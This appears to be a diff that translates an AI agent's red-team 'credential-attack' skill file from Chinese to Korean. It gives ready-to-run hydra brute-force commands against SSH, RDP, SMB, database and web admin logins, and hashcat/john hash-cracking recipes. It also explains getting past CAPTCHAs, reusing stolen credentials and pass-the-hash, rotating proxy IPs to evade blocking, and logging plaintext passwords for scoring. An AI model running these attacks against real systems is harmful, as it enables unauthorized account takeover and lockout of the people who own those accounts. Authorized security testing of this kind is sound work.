@@ -1,46 +1,46 @@
 ---
 name: credential-attack
-description: 凭据攻击：在线弱口令爆破（hydra）与离线哈希破解（hashcat/john），覆盖 SSH/FTP/RDP/SMB/数据库/Web 后台
-whenToUse: 发现登录入口（Web 后台/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis）需要试口令；或已拿到哈希/密文需要还原明文
+description: 자격 증명 공격: 온라인 약한 비밀번호 브루트포스(hydra)와 오프라인 해시 크랙(hashcat/john), SSH/FTP/RDP/SMB/데이터베이스/Web 관리자 페이지 커버
+whenToUse: 로그인 엔트리(Web 관리자/SSH/FTP/RDP/SMB/MySQL/MSSQL/Redis)를 발견해 비밀번호를 시험해야 할 때, 또는 이미 해시/암호문을 확보해 평문을 복원해야 할 때
 role: exploit
 enabled: true
 ---
 
-# 凭据攻击（在线爆破 + 离线破解）
+# 자격 증명 공격(온라인 브루트포스 + 오프라인 크랙)
 
-红队里"拿账号权限"最稳的两条路之一（另一条是配置/源码泄露拿到明文）。
-**本技能只管把口令试出来**；试出来之后必须用技能 `browser-automation` / `kimi-webbridge`
-**在真实浏览器登录一次**才算拿到账号权限（红线：只有凭据不算拿到账号）。
+레드팀에서 "계정 권한을 얻는" 가장 안정적인 두 경로 중 하나다(다른 하나는 설정/소스 유출로 평문을 얻는 것).
+**이 스킬은 비밀번호를 시험해 알아내는 데까지만 담당한다**; 알아낸 뒤에는 반드시 스킬 `browser-automation` / `kimi-webbridge` 로
+**실제 브라우저에서 한 번 로그인**해야 계정 권한을 얻은 것으로 인정한다(레드라인: 자격 증명만으로는 계정 획득이 아니다).
 
-## 本机工具
+## 이 머신의 도구
 
-| 工具 | 路径 | 版本 | 用途 |
+| 도구 | 경로 | 버전 | 용도 |
 | --- | --- | --- | --- |
-| **hydra** | `/usr/bin/hydra` | 9.7 | 在线爆破，覆盖 50+ 协议 |
-| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 离线哈希破解（GPU/CPU） |
-| **john** | `/usr/sbin/john` | — | 离线破解（自动识别格式，配置简单） |
+| **hydra** | `/usr/bin/hydra` | 9.7 | 온라인 브루트포스, 50+ 프로토콜 커버 |
+| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | 오프라인 해시 크랙(GPU/CPU) |
+| **john** | `/usr/sbin/john` | — | 오프라인 크랙(형식 자동 식별, 설정 간단) |
 
-字典：`/usr/share/wordlists/`（含 `rockyou.txt` 需 gunzip）、`/usr/share/seclists/Passwords/`。
-**没有 rockyou 时先解压**：`sudo gunzip /usr/share/wordlists/rockyou.txt.gz`（需授权，没有就换 seclists 里的）。
+사전: `/usr/share/wordlists/`(`rockyou.txt` 포함, gunzip 필요), `/usr/share/seclists/Passwords/`.
+**rockyou 가 없으면 먼저 압축을 푼다**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`(권한이 필요하다. 없으면 seclists 의 것으로 바꾼다).
 
-## 一、在线爆破（hydra）
+## 1. 온라인 브루트포스(hydra)
 
-### 通用语法
+### 공통 문법
 ```bash
-hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [模块参数] -t <并发> -f -o runs/hydra-<target>.txt
+hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [모듈 인자] -t <동시성> -f -o runs/hydra-<target>.txt
 ```
-- `-L` 用户名字典 / `-l` 单个用户名；`-P` 口令字典 / `-p` 单个口令
-- `-t` 并发（**默认 16，别超过 16**，多数服务会锁号或封 IP）
-- `-f` 命中一个就停（避免把账号打锁）
-- `-o` 输出到 `runs/`（报告要靠它复现）
-- `-V` 显示每次尝试（调试用，正式跑别开）
+- `-L` 사용자 이름 사전 / `-l` 단일 사용자 이름; `-P` 비밀번호 사전 / `-p` 단일 비밀번호
+- `-t` 동시성(**기본 16, 16 을 넘기지 않는다**. 대부분의 서비스가 계정을 잠그거나 IP 를 차단한다)
+- `-f` 하나 맞으면 중단(계정이 잠기는 것을 피한다)
+- `-o` `runs/` 로 출력(보고서 재현에 필요하다)
+- `-V` 매 시도 표시(디버깅용. 실전에서는 켜지 않는다)
 
-### 各协议实例
+### 프로토콜별 예시
 ```bash
 # SSH
 hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt
 
-# RDP（注意：并发必须低，Windows 会锁号）
+# RDP(주의: 동시성을 반드시 낮춘다. Windows 가 계정을 잠근다)
 hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt
 
 # SMB
@@ -55,101 +55,101 @@ hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f
 # MSSQL
 hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f
 
-# Web 表单登录（POST）——最常用
+# Web 폼 로그인(POST) — 가장 많이 쓴다
 hydra -L users.txt -P pass.txt target.example.com http-post-form \
-  "/admin/login.jsp:username=^USER^&password=^PASS^:F=用户名或密码错误" -t 8 -f -o runs/hydra-web-admin.txt
+  "/admin/login.jsp:username=^USER^&password=^PASS^:F=아이디 또는 비밀번호 오류" -t 8 -f -o runs/hydra-web-admin.txt
 
-# Web 表单（带额外头/HTTPS）
+# Web 폼(추가 헤더/HTTPS)
 hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
   "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
 ```
 
-### Web 表单爆破的成败判定（关键）
-`http-post-form` 第三段格式：`"<路径>:<POST 体>:<失败条件>"`，**失败条件必须写准**，否则全量误报：
-- `F=<失败特征串>`：响应里出现该串表示**失败**（推荐，最稳）
-- `S=<成功特征串>`：响应里出现该串表示**成功**（响应无统一失败文案时用）
-- 先手工发两次请求（错误口令 vs 正确口令各一次，或对比不存在用户）**确认特征串唯一**，再跑爆破。
-- 有验证码 / 图形码 / 滑块：先看能不能绕过（固定验证码、验证码不校验、前端校验），绕不过**不要硬爆**（技能 `browser-automation` 可做有限次带验证码尝试），转别的路。
+### Web 폼 브루트포스의 성패 판정(핵심)
+`http-post-form` 세 번째 구간 형식: `"<경로>:<POST 본문>:<실패 조건>"`, **실패 조건을 정확히 써야 한다**. 아니면 전량 오탐이 된다:
+- `F=<실패 특징 문자열>`: 응답에 그 문자열이 나오면 **실패**(권장, 가장 안정적)
+- `S=<성공 특징 문자열>`: 응답에 그 문자열이 나오면 **성공**(응답에 통일된 실패 문구가 없을 때 사용)
+- 먼저 손으로 두 번 요청한다(틀린 비밀번호와 맞는 비밀번호를 각각 한 번, 또는 존재하지 않는 사용자와 비교)**특징 문자열이 유일한지 확인**한 뒤 브루트포스를 돌린다.
+- 캡차 / 이미지 코드 / 슬라이더가 있으면 먼저 우회 가능성을 본다(고정 캡차, 캡차 미검증, 프런트엔드 검증). 우회가 되지 않으면 **무리하게 돌리지 않는다**(스킬 `browser-automation` 으로 제한된 횟수의 캡차 동반 시도가 가능하다). 다른 경로로 전환한다.
 
-### 字典优先级（省时间的关键）
-1. **针对性小字典**（命中率最高）：单位名/品牌/域名/年份组合，如 `单位简称@2026`、`Admin@123`、`<域名>2026`；
-   用 `redteam_asset_query` 里的 title/单位信息现造。
-2. **默认口令字典**：产品默认口令（`admin/admin`、`tomcat/tomcat`、`weblogic/weblogic1`、`sa/sa`），
-   参考 nuclei 模板 `http/default-logins/`（307 个），**先查 `redteam_poc_search`**。
-3. **常见弱口令 TOP**：`/usr/share/seclists/Passwords/Common-Credentials/` 下的 10-million / top-100 等。
-4. 通用大字典（rockyou）放最后——慢且噪声大。
+### 사전 우선순위(시간을 아끼는 핵심)
+1. **표적 소형 사전**(적중률 최고): 기관명/브랜드/도메인/연도 조합. 예: `기관약칭@2026`, `Admin@123`, `<도메인>2026`.
+   `redteam_asset_query` 의 title/기관 정보로 즉석에서 만든다.
+2. **기본 비밀번호 사전**: 제품 기본 비밀번호(`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`).
+   nuclei 템플릿 `http/default-logins/`(307개)를 참고하고, **먼저 `redteam_poc_search`** 로 조회한다.
+3. **흔한 약한 비밀번호 TOP**: `/usr/share/seclists/Passwords/Common-Credentials/` 아래의 10-million / top-100 등.
+4. 범용 대형 사전(rockyou)은 맨 마지막——느리고 노이즈가 크다.
 
-### 用户名从哪来
-- Web 后台：报错信息、JS 里的默认账号、接口返回的 `createBy`、登录页提示、`robots.txt`、员工邮箱前缀；
-- 目录爆破命中 `/admin` 时优先试 `admin`、`administrator`、`system`、`test`、`guest`；
-- 拿到一个凭据后走**凭据复用**（见下），比爆破快得多。
+### 사용자 이름은 어디서 얻는가
+- Web 관리자: 오류 메시지, JS 안의 기본 계정, 인터페이스가 돌려주는 `createBy`, 로그인 페이지 힌트, `robots.txt`, 직원 메일 앞부분;
+- 디렉터리 브루트포스에서 `/admin` 이 나오면 먼저 `admin`, `administrator`, `system`, `test`, `guest` 를 시도한다;
+- 자격 증명 하나를 얻었으면 **자격 증명 재사용**(아래 참조)으로 간다. 브루트포스보다 훨씬 빠르다.
 
-## 二、离线破解（hashcat / john）
+## 2. 오프라인 크랙(hashcat / john)
 
-拿到哈希/密文（数据库、配置文件、`/etc/shadow`、Web 应用库）后离线跑，**不产生目标侧流量**，比在线爆破安全得多。
+해시/암호문(데이터베이스, 설정 파일, `/etc/shadow`, Web 애플리케이션 DB)을 확보했으면 오프라인으로 돌린다. **대상 측 트래픽이 발생하지 않아** 온라인 브루트포스보다 훨씬 안전하다.
 
 ```bash
-# 1) 先识别哈希类型
+# 1) 먼저 해시 형식을 식별한다
 hashcat --identify hashes.txt
 
-# 2) NTLM（Windows）
+# 2) NTLM(Windows)
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3
 
-# 3) NetNTLMv2（Responder 抓到的）
+# 3) NetNTLMv2(Responder 로 수집한 것)
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 
-# 4) MD5 / SHA1（Web 应用库）
+# 4) MD5 / SHA1(Web 애플리케이션 DB)
 hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
 
-# 5) bcrypt（WordPress / PHP）
+# 5) bcrypt(WordPress / PHP)
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
 
-# 6) 加规则（用规则把字典放大 10 倍，性价比最高）
+# 6) 규칙 적용(규칙으로 사전을 10배로 늘린다. 가성비 최고)
 hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-# 7) 掩码爆破（已知口令策略，如 8 位数字 + 大写字母）
+# 7) 마스크 브루트포스(비밀번호 정책을 알 때. 예: 8자리 숫자 + 대문자)
 hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
 ```
 
 ```bash
-# john：格式识别省事，配置在 ~/.john/john.conf
+# john: 형식 식별이 편하다. 설정은 ~/.john/john.conf
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show hashes.txt
 ```
 
-**注意**：本机可能没有 GPU，`hashcat` 走 CPU 会慢——优先用规则+小字典，或把哈希存到 `runs/` 后续处理；
-**不要为了破解挂几个小时**，破解不出来就用哈希直接打（Pass-the-Hash，见技能 `lateral-movement`）。
+**주의**: 이 머신에는 GPU 가 없을 수 있어 `hashcat` 이 CPU 로 돌면 느리다——규칙 + 소형 사전을 우선하고, 또는 해시를 `runs/` 에 저장해 나중에 처리한다;
+**크랙에 몇 시간을 매달지 않는다**. 크랙이 되지 않으면 해시로 직접 공격한다(Pass-the-Hash, 스킬 `lateral-movement` 참조).
 
-## 三、凭据复用（比爆破快得多，优先做）
+## 3. 자격 증명 재사용(브루트포스보다 훨씬 빠르다. 먼저 한다)
 
-拿到任何一组凭据后，**先横向试**，不要急着爆下一个：
-1. `redteam_credential_list` 看已有凭据（含用户名/口令/来源）；
-2. 同一口令试：其他同款系统、其他资产的管理端、SSH/RDP/SMB/数据库、VPN/堡垒机/运维平台；
-3. 用户名规律（`姓.名`、工号、邮箱前缀）配合已知口令试同系统其它用户；
-4. 哈希直接复用：PtH / Pass-the-Key（技能 `lateral-movement`）。
+자격 증명 한 쌍을 얻었으면 **먼저 횡적으로 시도**한다. 다음 대상을 서둘러 브루트포스하지 않는다:
+1. `redteam_credential_list` 로 보유 자격 증명(사용자 이름/비밀번호/출처)을 확인한다;
+2. 같은 비밀번호로 시도: 동일 계열 다른 시스템, 다른 자산의 관리 콘솔, SSH/RDP/SMB/데이터베이스, VPN/배스천/운영 플랫폼;
+3. 사용자 이름 규칙(`성.이름`, 사번, 메일 앞부분)과 알려진 비밀번호로 같은 시스템의 다른 사용자를 시도한다;
+4. 해시 직접 재사용: PtH / Pass-the-Key(스킬 `lateral-movement`).
 
-## 四、纪律与边界（必须遵守）
+## 4. 규율과 경계(반드시 지킨다)
 
-1. **先查库**：`redteam_credential_list` / `redteam_asset_query`——别重复爆同一个入口（`blocked_count>0` 的先看原因）。
-2. **锁号风险**：Windows（RDP/SMB）与 OA/域账号**严格限流**：`-t 2`（Windows）、`-t 4`（SSH/FTP）、
-   字典不超过百条量级；**同一账号连续失败 5 次就停**，换账号或换目标——把账号打锁等于毁掉入口。
-3. **同一目标累计被封 >3 次放弃**（`redteam_asset_test` status=abandoned + blocked=true）。
-4. **降噪走代理**：Web 表单爆破用技能 `cn-proxy-pool` 换出口 IP；内网目标走 suo5 隧道。
-5. **内网优先用 fscan**：内网段落的弱口令普查交给技能 `fscan-intranet`（28 类服务批量爆破，一趟出结果），
-   hydra 用于 fscan 没覆盖的协议或需要精细控制的单点。
+1. **먼저 DB 를 조회한다**: `redteam_credential_list` / `redteam_asset_query`——같은 엔트리를 중복 브루트포스하지 않는다(`blocked_count>0` 이면 이유를 먼저 본다).
+2. **계정 잠금 위험**: Windows(RDP/SMB)와 OA/도메인 계정은 **엄격히 속도를 제한**한다: `-t 2`(Windows), `-t 4`(SSH/FTP),
+   사전은 100건 규모를 넘기지 않는다; **같은 계정에서 연속 5회 실패하면 중단**하고 계정이나 대상을 바꾼다——계정을 잠그는 것은 엔트리를 파괴하는 것이다.
+3. **같은 대상에서 누적 차단 3회를 넘으면 포기**한다(`redteam_asset_test` status=abandoned + blocked=true).
+4. **노이즈 감소는 프록시로**: Web 폼 브루트포스는 스킬 `cn-proxy-pool` 로 출구 IP 를 바꾼다; 내부망 대상은 suo5 터널을 쓴다.
+5. **내부망은 fscan 우선**: 내부망 대역의 약한 비밀번호 일괄 점검은 스킬 `fscan-intranet` 에 맡긴다(28종 서비스 일괄 브루트포스, 한 번에 결과).
+   hydra 는 fscan 이 커버하지 않는 프로토콜이나 정밀 제어가 필요한 단일 지점에 쓴다.
 
-## 五、输出与落库（强制）
+## 5. 출력과 DB 기록(강제)
 
-1. **每条命中立刻 `redteam_credential_add`**：
-   - `username`、**明文写 `secret_value`**（面板直接显示，便于随时复用）、`source`（`弱口令`/`默认口令`/`凭据复用`/`泄露`/`离线破解`）、
-     `tool`（实际命令原文，如 `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`）、`secret_ref`（证据文件路径如 `runs/hydra-ssh-10.0.0.5.txt`）。
-2. **必须实测登录才记分**：Web 后台用 `browser-automation` / `kimi-webbridge` 真实登录一次
-   （打开登录页 → 填账号口令 → 确认进入后台 → 记页面标题/菜单/当前用户名 → 抓 Cookie 存证据）→
-   `redteam_access_add`（`method=web-login`）→ `redteam_score_hit`（`web-app` 10 分 / `web-app` 20 分，
-   `evidence` 写「资产｜后台管理员 tomcat/Tomcat@2024」）。
-   **登不进去就在 `redteam_asset_test` 的 `test` 里记一行卡点**（哈希未破解/需二次认证/限制来源 IP/账号已禁用），不记分。
-3. **账号权限按服务封顶**：同一资产同一端口只算一次分，拿到管理员即该服务拿满——不要在同一服务上刷多个账号。
-4. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），
-   `tool` 写实际命令、`result` 写回显摘要（如 `ssh 10.0.0.5 用 root/Root@123 登录成功，uid=0(root)`）。
-5. 哈希文件、破解结果一律放 `runs/`。
+1. **적중할 때마다 즉시 `redteam_credential_add`**:
+   - `username`, **평문을 `secret_value` 에 기록**(패널에 그대로 표시되어 언제든 재사용하기 좋다), `source`(`약한 비밀번호`/`기본 비밀번호`/`자격 증명 재사용`/`유출`/`오프라인 크랙`),
+     `tool`(실제 명령 원문. 예: `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), `secret_ref`(증거 파일 경로. 예: `runs/hydra-ssh-10.0.0.5.txt`).
+2. **실제 로그인을 검증해야 점수를 기록한다**: Web 관리자는 `browser-automation` / `kimi-webbridge` 로 실제 한 번 로그인한다
+   (로그인 페이지 열기 → 계정/비밀번호 입력 → 관리 화면 진입 확인 → 페이지 제목/메뉴/현재 사용자 이름 기록 → Cookie 수집 후 증거 저장) →
+   `redteam_access_add`(`method=web-login`) → `redteam_score_hit`(`web-app` 10점 / `web-app` 20점,
+   `evidence` 에 "자산|관리자 tomcat/Tomcat@2024" 처럼 쓴다).
+   **로그인하지 못하면 `redteam_asset_test` 의 `test` 에 막힌 지점 한 줄을 기록**하고(해시 미크랙/2차 인증 필요/출발지 IP 제한/계정 비활성) 점수를 기록하지 않는다.
+3. **계정 권한은 서비스 단위로 상한**: 같은 자산 같은 포트는 한 번만 점수로 센다. 관리자를 얻으면 그 서비스는 만점이다——같은 서비스에서 여러 계정으로 점수를 쌓지 않는다.
+4. 핵심 동작마다 `redteam_chain_add`: `stage_code=internet`(또는 `internal`),
+   `tool` 에 실제 명령, `result` 에 출력 요약(예: `ssh 10.0.0.5 에 root/Root@123 으로 로그인 성공, uid=0(root)`).
+5. 해시 파일과 크랙 결과는 모두 `runs/` 에 둔다.
